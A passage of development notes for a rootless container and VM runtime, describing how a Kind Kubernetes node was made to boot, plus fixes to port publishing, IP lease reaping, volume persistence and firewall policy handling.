**Update (-p/parity session)**: `--entrypoint` ALREADY EXISTS in the CLI (`cmd_run`, docker
semantics, `""` clears it), and the likely root cause was fixed in the engine (bind fallback of the host's /sys
when mounting a new sysfs gives EPERM under `--privileged --net host`, + the cgroup2 mountpoint
created post-pivot_root — see commit `dfe7e0b`). Revalidation of the `kindest/node` boot pending.

**RESOLVED — cgroup detection is no longer the blocker** (-p/parity session, confirmed with
real instrumentation via `--entrypoint /bin/bash` + `set -x`). With the sysfs fix (`dfe7e0b`),
inside the `--privileged` container `/sys/fs/cgroup` is `cgroup2fs` with ALL controllers
(`cpuset cpu io memory hugetlb pids rdma misc dmem`, 41 entries) — before it was empty. The
`kindest/node` entrypoint, run under `systemd-run --user --scope -p Delegate=yes`, now prints
**`INFO: detected cgroup v2`** (it was "detected cgroup v1" + death) and advances much further:
userns ✓, shared mounts ✓, cgroup v2 ✓, machine-id ✓, faking DMI "kind" ✓, iptables legacy.
Along the way, a **fixed deadlock** was also discovered: in console mode (`privileged +
detach + log_path`), if init dies before sending the pty master and a reparented grandchild
holds the socketpair, `run` hung FOREVER with no log — `recv_fd` gained `SO_RCVTIMEO` 10s.

**RESOLVED — netfilter is no longer the blocker** (loop /loop netfilter). Cause isolated: with an
OWN netns (owned by the container's userns, i.e. `CLONE_NEWNET` and NOT `--net host`), `CAP_NET_ADMIN`
is effective and the **nft backend works** (`nft add table`, `iptables-nft -L/-A` all OK). The
**legacy backend does NOT**: it reads `/proc/net/ip_tables_names`, a `0440` file owned by the HOST's root which in
our userns appears owned by an unmapped owner (nobody) → EPERM (the host itself, as non-root,
also cannot read it). The Kind entrypoint's `select_iptables()` counts lines of `iptables-legacy-save` vs
`iptables-nft-save`; in a fresh netns both give 0 and the tie (`legacy >= nft`) falls to legacy —
the broken path. **Fix (`seed_kind_nft` in `container_init`, analogous to `mask_slow_node_units`)**:
for a Kind node (`node_cgroup`), seed ONE `iptables-nft -A INPUT -j ACCEPT` rule (harmless, BEFORE
the `execve`, still with CAP_NET_ADMIN) → `iptables-nft-save` reports ≥1 line → Kind picks nft.

**CURRENT STATE — `kindest/node` BOOTS** (`run --privileged --detach --net none` under
`systemd-run --user --scope -p Delegate=yes`, with both fixes: sysfs `dfe7e0b` + `seed_kind_nft`):
`detected cgroup v2` → `setting iptables to detected mode: nft` → `starting init` → `systemd 252
running in system mode` → `Welcome to Debian GNU/Linux 12` → dozens of `Reached target`/`Started`
→ it creates `kubelet.slice`. The container stays **Running**. The original NO-GO (the node's
systemd+cgroup does not boot) is **closed**.

**Connectivity WIRED + netfilter validated end-to-end** (loop netfilter, 2nd iteration). With
`--net host -p 6443:6443` (own netns + slirp4netns — see `cmd_run`, `new_netns` +
`slirp_attach`) the Kind node boots WITH network: `tap0` `10.0.2.100/24`, resolves `registry.k8s.io`
(outbound OK), `detected cgroup v2` → `iptables mode: nft` → systemd (0 failed units) →
**containerd `active`** (socket `/run/containerd/containerd.sock`). **`kubeadm init phase preflight`
PASSES** (RC=0) without ONE netfilter/iptables ERROR — advancing to the image pulls. Warnings only about:
swap, cgroup `cpuset missing` (delegation gap, see below), hostname `debuerreotype`. The
bridge sysctls are active on the node (`bridge-nf-call-iptables=1`, `ip_forward=1`). **Netfilter
is resolved end-to-end** for the real k8s workload.

**Bug fixed along the way — `exec` dropped caps in `--privileged` containers**: `runtime::exec`
used `resolve_cap_keep` unconditionally (default KEPT_CAPS, without CAP_NET_ADMIN), ignoring
`container.privileged` — unlike init (`spawn`, `if privileged { all_caps_mask() }`).
Debugging netfilter from the inside (`nft`/`iptables` via `delonix container exec`) gave "Operation not
permitted" despite init having the caps. Fixed: `exec` mirrors init (full caps + seccomp
unconfined when privileged). Confirmed: exec CapEff `1ffffffffff`, `nft` via exec OK.

### A REAL KUBERNETES CLUSTER RUNNING — `kubeadm init` COMPLETE (2026-07-17)

A Kubernetes v1.34 control-plane **Ready** on Delonix, rootless, daemonless, **without Docker**:

```
NAME   STATUS   ROLES           AGE   VERSION            CONTAINER-RUNTIME
kadm   Ready    control-plane   8m    v1.34.0            containerd://2.1.3
etcd / kube-apiserver / kube-controller-manager / kube-scheduler / kube-proxy / kindnet  →  todos 1/1 Running
```

Proofs that matter: **kube-proxy programs netfilter** in our rootless netns (`nft list tables`
→ `table ip filter`, `table ip mangle`, `table ip nat`) and the node registers with `INTERNAL-IP 10.0.2.100`.

**The recipe that a rootless Kind node REQUIRES** (the `delonix cluster` has to generate it; none of this is a
runtime bug — it is kubelet/kube-proxy config, and it is exactly what rootless `kind` also does):
1. **`featureGates: { KubeletInUserNamespace: true }`** in `/var/lib/kubelet/config.yaml`. It is THE
   decisive step. Without it the kubelet dies at `open /dev/kmsg` — and the kubelet itself states the solution in the log
   ("running in UserNS, Hint: enable KubeletInUserNamespace feature flag"). Trying to give it a
   `/dev/kmsg` does NOT solve it: a bind of the host's kmsg is `root:adm 0640` (the mapped uid cannot open it) and a
   symlink to `/dev/console` only swaps ENOENT for EIO. With the gate, the kubelet ignores kmsg.
2. **`--fail-swap-on=false`** on the kubelet: a container inherits the HOST's `/proc/swaps` — the swap fix
   of the golden VM image (fstab) does not apply here.
3. **`conntrack: { maxPerCore: 0, min: 0 }`** in the kube-proxy ConfigMap: `nf_conntrack_max` is a
   global sysctl, not writable from a userns (`permission denied` → CrashLoopBackOff).
4. CNI: the image's `/kind/manifests/default-cni.yaml` (kindnet) applies as-is (just substitute
   `{{ .PodSubnet }}`); the node becomes `Ready` ~1min later.

**Learned along the way (resource leaks — see "Production/HA")**: the kubelet applied the taint
`node.kubernetes.io/disk-pressure` because **49 orphan rootfs** (~45 GiB) from earlier spikes had
filled the disk to 89%. Container directories survive abrupt deaths with no one to reap them.

**Next slices (no longer netfilter)**: (1) cgroup `cpuset` in delegation (preflight marks it
"missing required" — only a WARNING, but close it for a clean node); (2) run the full `kubeadm init`
to a Ready control-plane (preflight already passes; the real pull+init+CNI remain to be exercised); (3)
`--net kind` rootless (setns) for nodes in the SAME network instead of a per-node isolated slirp. The Docker shim
comes after these, but the foundation — cgroup + netfilter + systemd + containerd + network — boots.


### RESOLVED — published ports died on their own: it was `delonix-engine`, not the runtime (2026-07-17)

**Closed.** This bug burned several sessions because the diagnosis recorded here was WRONG on
both premises: it said "both halves of `publish_port` fail SILENTLY" and sent people to
look for whoever called `unpublish_port`. They do not fail, and there is no caller at all.

**Symptom**: a published port serves HTTP 200 and ~10–16s later gives `000`, with the container `Running` and
no `stop`/`rm`.

**What was proven, by measurement** (not by reading code):
1. The **DNAT stays intact** (`nft list table ip dlxing` shows the rule long after `curl` already gives
   `000`). Only the slirp `hostfwd` vanishes — it is not "both halves".
2. **No code in this repo removes it**: instrumented `unpublish_port`, `slirp_remove_hostfwd`,
   **all** the non-`list` commands of `slirp_api` (catches the `remove_hostfwd` that
   `reap_orphan_hostfwds` sends directly) and `control_send`. Zero occurrences, always.
3. Slirp and the holder **do not restart** (same pid); the holder's `control_loop` has nothing periodic.
4. A hostfwd added **by hand** through the api-socket, with no delonix involved, **also** vanishes.
5. **It is not a slirp4netns bug**: a clean-room slirp, same flags, `unshare -r -n` target,
   kept the hostfwd for all 33s.

**Root cause, proven with SIGSTOP** (freezing the engines, without killing anything):
```
engines A CORRER   → hostfwd criado a t=0,00s · DESAPARECE a t=12,01s
engines CONGELADOS → hostfwd criado a t=0,00s · PERSISTE os 30s todos
```
It is the **`delonix-engine` (delonix-paas, a PRIVATE product)** reaping ports that are not its own:
`crates/delonix-api/src/ui.rs:12937` calls `reap_orphan_hostfwds(&live)` with a `live` that only has ITS
containers — so everything the runtime CLI publishes is, to it, an orphan. Aggravating factor:
`crates/delonix-api/Cargo.toml:15` pins `delonix-sdn` to **tag v0.1.0**, the OLD version of the reaper
(the fail-open one: empty list ⇒ "nothing in use" ⇒ delete everything). That is why removing the caller HERE
(`9bbbd11`) changed nothing: the copy that runs is the PaaS one.

**The fix is NOT in this repo** (isolation rule) — it is in `delonix-paas`: the engine cannot
reap hostfwds it did not create, and the `delonix-sdn` pin has to be raised. On this side, what makes
sense is defense in depth: **`reap_orphan_hostfwds` is dead code (zero callers) and is a
trap for consumers** — a public function that deletes shared state and fails OPEN with an
empty list. Delete it, or make it fail-closed.

**A tool that stayed**: `DELONIX_TRACE_UNPUBLISH=<file|stderr>` logs who unpublishes
(function, port, pid/ppid/exe + backtrace), in `slirp_api`/`control_send`/`unpublish_port`. Zero cost
without the env var. It was what let us EXONERATE this repo — without it we would again have suspected the wrong
code.

**Still open**: the ingress `refcount` leaks (16 with 3 live containers).

### IPAM leaks, and the reaper that exists is not its own (measured 2026-08-25)

Measured on this host's real root, and cross-checked — not deduced: `ipam/10.210.json` has **391
leases** and only **47** correspond to a container that still exists (`container ps -a
--output json`). 88% have no live owner. It is not an outside read being fooled, like the
`_data` `chmod 700`: the file is ours, it is JSON, and the keys are container ids.

**Where it leaks**, followed path by path:

- `ipam::release` has **two callers in the whole tree**, both inside
  `infra::detach_container`/`detach_extra_container` (`infra.rs:5170` and `5180`).
- `container rm` only calls the detach `if let Some(ip) = &c.ip` — a record without an IP does not
  free anything.
- The backstop for those that die and are never `rm`'d is the `reap_orphan_refs` of `system prune`,
  and **it removes the REFERENCE MARKER, not the lease**: read in full, it touches
  `refs_dir()` and nothing else. The `cmd_rm` comment calls it "the backstop for
  containers that die and are never `rm`'d at all" — and it is, for the refcount. For IPAM
  there is no reaper at all: `grep ipam::` outside the module itself gives allocate/reserve/lookup
  /release and zero sweeps.

**The class is the already-catalogued one, with a new name**: *the reaper of one thing is not the
reaper of the other*. The two live in the same `<root>/ingress`, are freed by the same
`detach`, and so they read as one — but only one has anyone to clean it when the
normal path does not run.

**Why the reaper was NOT written already** (and the order matters): reclaiming a lease that
is actually in use hands the same IP to two containers. The criterion "there is no container with
this id" is almost certain and is not proof — a container being created has a lease before it has a
record, which is precisely what the `REF_MARKER_GRACE` of `reap_orphan_refs` exists to
respect. An IPAM reaper needs the same grace period, the same `FileLock`, and
a chaos scenario that exercises it against a concurrent attach — the precedent is the
`volumes rm` of v0.37.0, and the counter-example is `reap_orphan_hostfwds`, which failed OPEN
with an empty list and killed the published ports of a completely unrelated engine.

Until it exists, the ceiling is wide (a `/16` gives 65 thousand addresses per network) and the symptom
is invisible — but it is monotonic, and today there is not a single command that shows it. The
`network ipam ls` (read-only) is the step that comes before any reaping.

**CLOSED (2026-09-15): `network ipam ls` + `network ipam prune`**, and `system prune`
sweeps it too (a `--auto` timer closes the leak with no second schedule). The reaper
(`ipam::reap_orphan_leases`) runs under the `IpamLock`, and a lease seen orphan for the first
time is only a CANDIDATE: it is reclaimed on a LATER run that still finds it orphan beyond the
SAME `REF_MARKER_GRACE` (the constant is shared, so the two windows do not diverge).
The clock lives in a separate file (`ipam/reap-candidates`, **without** `.json`, so that
`all_leases` skips it as it skips the `lock`).

**The draft had the defect this section predicted, and only reading the callers caught
it**: it judged "there is a container with this id" as alive. But a lease is keyed by the id
passed to `attach_container`, and a POD leases as `pod-<name>` (the netns), the
`netns attach` with a name of choice, the CRI with the sandbox id. Fifteen seconds after
the first pass, `prune` handed a RUNNING pod's IP to the next container.
Liveness now comes out of ONE function, `prune::lease_owners`, shared by `ls`,
by `prune` and by `system prune`: all container records (stopped included — a
`start` returns the same IP), each member's `pod`, and every linked ref marker. The
last two err on the side of KEEPING: an orphan marker holds its lease one
pass longer, and that recovers; a duplicated IP does not.

**And it fails CLOSED**: an unreadable store is `Err` (exit 77), never an empty set — empty
reads as "nothing lives" and would reclaim everything on the next pass, the counter-example of
`reap_orphan_hostfwds` cited above. Validated live with isolated roots (pod + container
+ a real orphan): the orphan leaves on the 2nd pass, the pod and the container stay, by both
paths; with `containers/` at `chmod 000` the command refuses without writing any candidate.

**One source of the leak, CLOSED at the origin**: `attach_container` did the `allocate` BEFORE the
`acquire`/control line, and no error path returned the lease — an attach that
fails (measured: a `DELONIX_NET_RUNTIME_DIR` too long for `SUN_LEN`) left it
behind with no container at all. The three attaches (`attach_container`, `_on_ip`, `_extra`) now go
through `restore_lease`, which restores the record to its state BEFORE the call and does not simply
free: on a re-attach (the `start` of a stopped one, a pod's recreated netns) the lease was already
there, and freeing it on a transient failure changed the container's IP on the next
attempt. Measured on the same failure: the old binary left the lease, the new binary left `{}`.

**The SAME defect lived in the REFS reaper, and was worse — measured live**: the live set
of `system prune` was container ids + `cri-*` + `vm-*`. A pod's marker is
`pod-<name>`, and it fell as an orphan. A lone pod on a node, `system prune --force` after the
grace window: the marker was reaped, the set went empty, `teardown_locked`
tore down the infra, and the RUNNING pod was left without `eth0` and with `Network unreachable`. A
routine cleanup brought down the network of a pods-only node. `prune::live_ref_owners` joins the
netns of every pod with at least one live member; an all-stopped pod remains reapable.
Validated: the same scenario with the new binary leaves `ingress UP · refcount 1` and the pod with
an IP and ping. **The lesson repeats this section's**: a lease and a marker are keyed by the id
passed to attach, and that id is NOT always a container id.

See [docs/RELATORIO-PRE-PRODUCAO.md](docs/RELATORIO-PRE-PRODUCAO.md) for the full E2E battery
(139 PASS / 1 FAIL) and the gap list.

### A holder surviving an in-place upgrade (v0.34.2) — the pidfile `status()` trap

A real bug report (host kaeso-sys-01): `cluster create --name dev` failed at `✗ Preparing nodes (1)`
with **``system call `control socket` failed: No such file or directory (os error 2)``** and nothing else.
The engine was fine; the HOST STATE was not: the running holder had been started by a binary
**prior to v0.34.1**, and that version changed the socket from `<DELONIX_ROOT>/ingress/control.sock` to
`/tmp/delonix-net-<uid>/control.sock` (commit `a112754`, see `runtime_dir`) — an `install.sh` on
top leaves the OLD holder alive, bound to a path the new binary never consults.

**The trap to remember**: `status()` decides "up" by reading **pidfiles**, never by reachability —
so `ensure_up()` returned early satisfied and the fast-fail of `control_query` (which only asks whether the
`holder_pid` exists) let it through, spending the 50×40ms of retries on a path that was never going to
appear. Each half was reasonable; together they turned "your holder is from the previous build" into an
error with no subject, no path and no recovery. **`holder_pid.is_some()` is not "the holder is
reachable"** — same family as `container.userns`, which is not "it is in a userns different from mine"
(see "Hot reconfiguration" above).

**Fixed** with `stale_holder_message` (pure, tested) called in BOTH places the condition
reaches — `ensure_up()` (with ~2s of grace for the legitimate startup race) and `control_query()`
after exhausting the retries (the teardown paths do not go through `ensure_up`; and a socket that
never APPEARED is a different failure from one that exists and refuses the connection). When the legacy socket
is still on disk, that **proves** the in-place upgrade and the message says so, naming the two
paths. **Deliberately does NOT self-heal**: killing a live holder frees the netns and brings down the network
of all the SDN's containers — it is the operator's decision, not a `cluster create`'s. `teardown()`
(`delonix net netns down`, the recovery command) also started cleaning the legacy paths,
so a FUTURE diagnosis does not blame a binary that no longer runs. Validated live on both branches
(with and without the legacy socket), plus the untouched happy path (15ms, one `stat`).

### `delonix cluster load` (v0.35.0) — the `kind load docker-image`, with no registry at all

A real request: `make push` of `delonix-meet` did `kind load docker-image` and the `kind` binary does not
exist on this host (nor would it serve — it needs a Docker/Podman provider, which this host does not have by
design). `delonix cluster load <IMAGE>... [--name <cluster>]` closes the gap: it packs the image
from the LOCAL store and imports it into the containerd of EACH running node.

- **`delonix_oci::write_oci_archive`** (`crates/adapters/delonix-oci/src/save.rs`, the inverse of the
  existing `load_docker_archive`): it writes an **OCI image layout** (tar) reusing the
  SAME manifest that `registry::build_manifest` publishes to a registry — the store's blobs go
  verbatim, nothing is recompressed or re-hashed, and the digests the node ends up with are identical to
  ours. Do not confuse it with `image export`/`export_rootfs` (a RUNTIME bundle for runc/crun).
  The `io.containerd.image.name` annotation is what NAMES the image on import — without it `ctr` ingests
  the blobs and registers no reference at all: the import "passes" and the pod stays in `ErrImagePull`.
- **The channel into the node: the bind mount that already existed** (`cluster_dir` ↔ `NODE_SHARED`
  `/kind/delonix`, the same one through which `cluster create` exchanges `kubeadm.conf`/`kubeconfig`) — with no
  stdin plumbing and no 2nd rootfs copy. The real `kind` does `docker save | docker exec`;
  here both halves are already ours.
- `--all-platforms` on `ctr images import` (otherwise ctr filters by ITS platform and may
  import zero while reporting success); the `.tar` is always deleted afterwards (it is a complete copy of the
  image on disk — this host has already had disk-pressure for less); stopped nodes are REPORTED, never
  silently skipped.
- **3 defects caught in v0.35.1, ALL invisible to `ctr`** (which reported success, and
  `crictl images` even listed the image): (1) the image was registered with the SHORT name
  (`nginx:alpine`) and the kubelet resolves the normalized form (`docker.io/library/nginx:alpine`) →
  `ErrImageNeverPull` (now `containerd_ref()`, pure and tested, with the docker rule; an explicit
  registry is NEVER rewritten); (2) `ctr images import` does not use the CRI plugin's snapshotter but
  the GLOBAL default (`overlayfs`), which does not mount in a rootless userns — the node config's
  `fuse-overlayfs` is now read and `--snapshotter` is passed, just as the real `kind` does; (3) the
  **containerd 2.x transfer service** refuses to unpack (`no unpack platforms defined`) — the classic
  `--local` path works, and it is PROVEN (it does not exist in containerd 1.6) rather than
  assumed; `--platform linux/<arch>` instead of `--all-platforms` (it is this that triggers the error).
- **Validation lesson**: "the command returned 0" is proof of nothing here. The proof is a `kubectl
  run --image-pull-policy=Never` becoming **Running** — no registry can save it. Validated
  this way on `delonix-stage` (containerd 2.1.3, rootless).

### SERIOUS BUG fixed on the way here: `-v` was never persisted → volumes LOST on `start`

Discovered by watching `cluster load` fail with the node not seeing `/kind/delonix`: `cmd_run` put the
resolved mounts ONLY into the `RunSpec` (applied at spawn) and **never into the registry**; `cmd_start`
rebuilds the `RunSpec` from `c.mounts` — a field that was therefore ALWAYS empty. A
`container start` of anything created with `-v` ran again **without bind mounts and without
named volumes**, and the writes that should go to the volume went silently to the container's
rootfs (a restarted database "works" and writes to the wrong place). It also broke
kind clusters: a restarted node lost its `/kind/delonix`. **Fixed** with `c.mounts =
mounts.clone()` before the save (including CDI mounts on purpose — `start` never re-resolves
a CDI spec, leaving them out would lose GPU access on the 1st restart). Validated live:
a host file visible inside the container BEFORE and AFTER a `stop`+`start`.

**The third bug of the SAME family in two days** (alongside `-p` on a custom network, below, and the
`vm start` that was already documented): *state needed to RECONSTRUCT the resource must be
persisted, not just used once at creation*. When wiring/reviewing any `start`/`restart` path,
compare field by field what creation USES with what the registry STORES — what only creation sees
vanishes on the first restart, silently.

### Regression v0.34.1 → fixed in v0.34.3: `-p` on a custom network (the 2nd uid-derived path)

A real bug report, one command after the v0.34.2 recovery: `container run --net <custom> -p
<port>` (and the `start` of a container like that) failed with ``slirp api-socket: No such file or
directory``. Containers WITHOUT published ports were never affected — it took a real workload
with a port (`kaeso-odoo`, 8069) to expose it.

**Cause**: `a112754` (v0.34.1) created a **SECOND uid-derived path** (`runtime_dir()`,
`/tmp/delonix-net-<uid>`) and only the first was being pinned across the privilege boundary.
The publish of a custom network runs on the **2nd pass of the re-exec** (`nsenter -U … ip netns exec`,
uid mapped to **0**): `reexec_into_netns` passed `DELONIX_ROOT` on purpose (because
`base_root()` consults `geteuid()`) but nothing pinned the new socket dir → the 2nd pass
resolved `/run/delonix-net` and spent the retries on a nonexistent directory. Before v0.34.1 the
sockets came from `ingress_dir()`, so the `DELONIX_ROOT` that was already passed covered them — **pinning only
the root stopped being enough without anyone noticing**.

**Lesson to remember (alongside the `container.userns` trap and the pidfile `status()`)**: whenever
a path constant starts deriving from `geteuid()`, grep for whoever resolves it ON THE OTHER SIDE of
a userns — `.env("DELONIX_ROOT"` marks all those places. No unit test catches this: the
divergence only exists in a child process with a mapped uid. Fixed with `infra::runtime_dir_env()`
(a `(var, value)` pair — impossible to pass var/value swapped, and `grep runtime_dir_env` finds all
the children that need it) and `cmd::container::reexec_env` (a list shared by the TWO re-exec
sites, so a third is not born with half).
## Strict manifests, App with fingerprint, Service ready (ADR-0069, 2026-10-03)

- **A field the engine does not understand REJECTS the manifest before any effect**
  (`manifest::load`), including the `spec.containers[]` items of a Pod
  (`POD_CONTAINER_FIELDS`: probes and `lifecycle` do not exist and are no longer lost silently).
  `stack validate` uses `load_lenient` to report; `DELONIX_MANIFEST_LENIENT=1` is the explicit
  escape valve. The warning counter is per-thread: a test that reads it uses `thread_unknown_fields`,
  never the global one (flaky in parallel).
- **`kind: App` converges**: `desired()` computes the fingerprint of the inputs (builder +
  source tree), `actual()` reads the `<state>/apps/<name>.json` registry only while the tag points
  to the recorded digest, and `apply` skips the build when they match.
- **`kind: Service`**: only `Running` ones enter, and, where there is a health check, only `healthy`.
- **Plan**: an unreadable store (VM, scoped volumes, presence of containers) is an error, not "empty".
- **Pod**: the same name in another namespace is `Conflict`, not "already exists".
- **CNI**: 60 s deadline (`DELONIX_CNI_TIMEOUT_SECS`) and 1 MiB per stream.
- **`secret rotate-key` rotates the KEY, not the values — and therefore does NOT touch the version** (ACH-034,
  fixed 2026-10-08). The rotation re-encrypted each secret via `SecretStore::save`, which decides the
  version by comparing against the file on disk — a file that at that point was already sealed with the
  OLD key. Decryption failed, fell into the first-write branch and wrote `1` over
  all of them: `Version: 4` → `Version: 1` without a single value changed. The values survived (it is just
  a re-encryption), so nothing looked broken; what broke was the field the consumer reads to know
  "did this change?" — the `delonix.io/secret-versions` annotation and the "rotated since" of `container
  describe` ended up saying the OPPOSITE of what happened, and a version that GOES BACKWARDS breaks
  any monotonic comparison. The `save` rule is correct and has a test: the fix is an internal write
  path (`SecretStore::write`) that receives the version to keep, and only `rotate_key` uses it —
  step 1 of the rotation already loaded each secret successfully, so the previous version is
  known and is not thrown away. Gates: the unit test `rotate_key_does_not_walk_the_version_backwards` (fails with
  the fix reverted, verified) and the five "secret rotate-key" checks of the battery.
- What was left undone and why is in ADR-0069 (policy before activation, `ResourceKey`
  with scope, operational refresh of the VM plan, OpenStack).

## A policy-governed workload is born closed (ADR-0069 D6, 2026-10-03)

- `policy_targets(docs)` (`cmd/firewall.rs`) lists the containers that a `NetworkPolicy`,
  `NetworkAccessRule` or `Dependency` of the manifest names; `container::apply` creates them with
  `RunOpts.policy_hold` (default-deny chain installed before the process; `delonix.io/policy-hold`
  annotation in the registry). While the annotation exists the dataplane stays closed and
  what the policies write goes to the REGISTRY (`apply_firewall_everywhere`).
- `release_policy_holds` runs after the policy layers and opens up to what they say; a
  direction that is not declared reverts to the open default. If a layer fails, the workload stays closed and
  the apply says so; the next apply releases it. Containers and Pods.
- **A VM's name is unique on the NODE, and the same name in another namespace is a conflict (2026-10-06).**
  The registry is `vms/<name>.json`, whatever namespace it declares, so two
  tenants cannot each have their own `web` — and a manifest that requested it received
  `stack plan` = "1 unchanged" and `stack apply` = "vm/web: ensured" with rc 0, **with the VM staying in the
  FIRST namespace**. In a VM the namespace IS the isolation boundary (`@dlxns_<ns>`): the
  tenant that requested the second one ended up with a VM that the first reaches and theirs does not. It is now
  rejected (`Conflict`, exit 5) before resolving or creating anything. It is the SAME rule that a Pod
  already stated, for the same reason — the shared netns and the member names are also not
  namespaced —, and therefore **giving them a namespaced plan name would be wrong**: the plan
  would start believing in two resources that the node cannot have. Who IS scoped in the plan are the
  `Container`, the `Service` and a `Volume` with `share` (`manifest::scoped_plan_name`). Gate:
  `the_same_vm_name_in_another_namespace_is_a_conflict` and the "vm: the same name in another
  namespace is a conflict" section of the battery, whose first two checks fail with the rejection reverted.
- **A guest is born closed in the PROVIDER's firewall, or it is not born.** A VM
  (`scope: vm`) or a system container (`scope: systemcontainer`) that a manifest policy
  governs is created with its own firewall in force, default-deny in both directions, BEFORE the
  guest has CPU — and only a backend with its own firewall can do that. One that
  cannot **REJECTS by name** (`VmBackend::holds_at_boot`, DX-1501), never creates the VM open: a
  VM standing up under a policy that says closed is the defect the hold exists to prevent. Today
  only Proxmox has it; the two local backends reject, and the rejection says where `scope: vm` serves.
  The release is the same as the containers' — a direction that no document declared reverts to
  open, and the annotation leaves LAST, so a failure to open leaves the guest marked
  closed for the next apply.
  **The `scope` is who decides, and it is read only within its own**: a container policy never makes a
  guest a target (it would be born closed with nothing to open it), and the same string in another scope
  declares nothing. Gates: `a_held_create_is_refused_by_a_backend_that_cannot_hold_at_boot` (fails with
  the rejection reverted, verified), `a_guest_is_a_target_only_through_a_policy_of_its_own_scope`
  and the "scope: vm on a backend without its own firewall rejects" check of the battery.
  **Closed 2026-10-06**, and what was missing were the READS: the mutations already accepted the pod
  name (`net ingress allow <pod>` wrote the rule) and `net ingress ls <pod>` answered "no such
  container" (rc=4), as did `describe networkpolicies <pod>/<dir>`. A rule that is written and
  not seen is worse than one that is not written. And `get networkpolicies` named the MEMBER where the
  operator wrote the POD: in a two-member pod it printed FOUR lines, and the two from the member without a
  firewall said "allow (default), 0 rules" over a policy that exists — a listing that
  DENIES a firewall. `governed_name` gives the name by which the policy was declared (the pod's for a
  member, its own for a container) and is what `list_rules` and `list_all_policies` use, the
  same name the write takes. Gates: the four "ADR-0069 item 1: the READ side" checks of the
  battery (three fail on the 5.0.0 binary) and the `policy-hold-pod-respawn` stage of the
  `policy_hold` scenario, which kills the pin, restores the infra and requires the pod recovered WITH the
  deny still enforced.
- **A DELETE that reports success must delete — and the generic verb did not delete.** Measured
  2026-10-06 against the published engine: with a `deny` in force, `delete networkpolicies
  <c>/ingress` answered **rc 0** and "removed 0 inbound rule(s)", `get`/`describe
  networkpolicies` kept reading `deny`, and a ping from another container STAYED blocked. The
  operator deletes the policy that closes the workload and it stays closed, with all the reads agreeing
  with the policy instead of with it. The cause: the verb called the cleanup of `net ingress
  clear`, which removes the RULES of a direction and leaves the default to the `policy` verb — coherent for
  that verb, and it is what its message promises; here the object deleted IS the policy, so the
  default has to go with it (`clear_dir_with(.., reset_policy: true)`, and `firewall_disposable`
  drops the whole firewall when nothing is left). The doc-comment of `cmd_delete_policy` claimed
  "same semantics as `net ingress clear`" — it was wrong and is the origin of the defect. Gates: the
  unit test `the_generic_delete_resets_the_direction_and_clear_keeps_the_policy` (fails with the
  fix reverted, verified) and the "delete networkpolicies" section of the battery, whose verdict is
  the TRAFFIC counted in `Icmp InEchos` of the target — a check by the ping rc would pass over a defect
  that delivers the packet. `net ingress clear` has its own check requiring that the default STAYS: without
  it, aligning the two verbs would pass as a fix.
- **A Pod is ONE policy target**: `firewall::update_locked`/`load_governed` resolve a name that
  is not a container to the pod's view (`pod::pod_view`: head-member registry with the shared netns
  as id and the pod's IP); only `firewall` and `annotations` revert to the head member. The declared
  network of a Pod travels in the members (`delonix.io/pod-network`) — reading `net_mode` of the member gave
  always `host` and every second apply of a pod on a custom network asked for `--replace`.
- `policy_hold` scenario of `scripts/chaos.sh` (lab = isolated roots, `DELONIX_ROOT` and
  `DELONIX_NET_RUNTIME_DIR`): the policy failure has to be AFTER the containers exist
  (an impossible CIDR in a `NetworkAccessRule`; a reference to a nonexistent container is
  caught earlier by `validate_graph` and the scenario skipped). `container inspect` already emits JSON.

## Why there are TWO guest Kinds, and why the perimeter policy is not a `NetworkPolicy` (ADR-0072/0073, 2026-10-06)

The last two rows of the ADR-0070 table — moving the perimeter from the
`NetworkGateway` to a scope of the `NetworkPolicy`, and the `SystemContainer` to a
guest Kind — were **measured and closed**: the D1 part of both was already
satisfied by ADR-0071 (the inline `provider` block), and the part about changing the Kind
was rejected with the cost written down.

- **A policy the NODE enforces is a `NetworkPolicy`; one that an APPLIANCE enforces
  is declared in the `NetworkGateway` that owns it.** The reason is ownership: the `OwnerMark`
  of a remote object is **per declaring registry** and is never rewritten (ADR-0059
  D1.5). A `NetworkPolicy` document would be a NEW registry, so the first apply
  duplicated each rule on a live appliance and left the originals orphaned. The shape of the
  rule is already the same in both (both descend through the same `PolicyIr`); what changes is
  only where it is declared.
- **The `SystemContainer` does not merge into the `VirtualMachine`**, by three measurements: it is
  `Namespaced::Never` where the VM is `Always` (the engine's isolation does not reach the provider's
  node, ADR-0058 T7), it is made of an **OCI image** where the VM is made of a
  **disk**, and the merge would force rejecting by name ~28 verbs that the LXC path
  never had (`console`, `ssh`, `vnc` included). A Kind has ONE answer to "is it
  namespaced?", and the two answers sustain code.

A new system-container provider enters through the `provider.type` of the
`SystemContainer` — that is what the per-resource typing of ADR-0071 is for — and
needs no new Kind.

## The `provider` block is `type` + `spec` (ADR-0070/0071, 2026-10-03)

- What only a manufacturer understands lives **inline** in the resource: `spec.provider: { type, spec }`.
  `type` (`libvirt`/`cloud-hypervisor`/`proxmox`) replaces `backend`; `spec` is typed per
  provider **and** per resource and a key the `type` does not have is rejected. `ref` is reserved until
  the node has named targets (the `providers.yaml` of ADR-0054 has one target per type).
- `Network` with `provider.type: proxmox` is an SDN segment: the networks that name the same zone
  merge, at load time, into the single `NetworkZone` that the executor already reconciles
  (`cmd/network_provider.rs`). `kind: NetworkZone` loads, announced as superseded.
- The previous spellings (`backend`, the `libvirt:` group, `provider: { name, libvirt }`, the flat
  fields) normalize to the same and are reported; **a second executor never**. A `cpuTopology`
  that does not multiply out to `vcpus` is rejected: the generic one is the intent.

## Product vision: Universal Runtime (Workload Abstraction Layer)

**Project's north**: the Delonix Runtime should not evolve as "just another VM engine" nor as
three disconnected CLIs (`container`/`vm`/`image`). The goal is a **Runtime Abstraction Layer**:
a single declarative API (`kind: Workload`, `spec.type: container|vm|microvm`) that dispatches to
the right engine, with pluggable compute backends — not hardcoded. This is a direction, not
a rewrite: it is implemented on top of what already exists, not replacing it.

### What already exists and serves as a base (do not invent from scratch)

- **`VmBackend`** (`crates/adapters/delonix-vm/src/lib.rs:438`) already IS the `ComputeDriver` pattern requested —
  `id()`/`available()`/`boot()` behind `CloudHypervisorBackend`/`LibvirtBackend`. Adding a
  new backend (Firecracker, a thinner native KVM) is implementing this trait, not designing a new one.
- **`delonix-cri`** already provides the "Container Runtime" leg of the unification (serves `kubelet` via
  `runtime.v1`) — it needs no new `ContainerController`, only a connection to the same `Workload`.
- **`delonix-sdn`** (rootless SDN + WireGuard overlay between nodes) already covers much of the "Network
  Engine" of the original request — what is missing is NAT/floating-IP/ACL per *tenant*, which is a notion forbidden
